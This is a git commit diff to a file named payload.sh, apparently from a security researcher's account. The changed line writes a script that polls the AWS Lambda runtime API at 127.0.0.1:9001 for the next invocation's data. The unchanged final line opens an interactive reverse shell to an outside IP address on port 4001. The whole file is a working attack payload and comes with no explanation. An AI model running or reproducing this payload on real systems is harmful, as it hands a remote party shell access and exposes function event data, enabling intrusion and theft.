b257381c74e58ba358232863e76e6c7066fea5ea
praetorian-snyk-max-1 <ben.kofman+1@praetorian.com>
2024-11-25 14:05:11 -0500

    Update payload.sh

--- payload.sh
+++ payload.sh
@@ -1,3 +1,3 @@
-echo 'const response = await fetch("http://127.0.0.1:9001/2018-06-01/runtime/invocation/next"); const data = await response.json(); console.log(data);' > script.js;
+echo '(async()=>{console.log(await(await fetch("http://127.0.0.1:9001/2018-06-01/runtime/invocation/next")).json())})().catch(console.error)' > script.js;
 chmod +x script.js;
 bash -i >& /dev/tcp/3.95.20.82/4001 0>&1;
